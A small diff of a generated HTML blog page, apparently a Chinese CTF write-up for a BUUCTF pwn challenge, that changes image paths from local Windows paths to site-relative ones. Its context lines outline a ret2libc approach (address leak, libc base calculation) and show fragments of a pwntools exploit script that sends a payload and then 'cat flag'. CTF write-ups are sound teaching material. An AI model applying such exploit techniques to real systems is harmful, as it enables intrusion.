@@ -40,8 +40,8 @@
 <p>2、leak地址，计算基地址，计算libc函数地址</p>
 <p>3、ret2libc3</p>
 <p>buuctf平台给出了libc版本，但是本题原本是没有libc的，这里可以使用LibcSearcher或者pwntools自带的DynELF来计算libc中函数的偏移</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200415184624444.png" alt="image-20200415184624444"></p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200415184410796.png" alt="image-20200415184410796"></p>
+<p><img src="/images/image-20200415184624444.png" alt="image-20200415184624444"></p>
+<p><img src="/images/image-20200415184410796.png" alt="image-20200415184410796"></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#75715e">#-*- cofing=UTF-8 -*-</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
@@ -70,7 +70,7 @@ payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span
 sh<span style="color:#f92672">.</span>sendline(payload2)
 sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200415184433661.png" alt="image-20200415184433661"></p>
+</code></pre></div><p><img src="/images/image-20200415184433661.png" alt="image-20200415184433661"></p>
 
 </main>
 
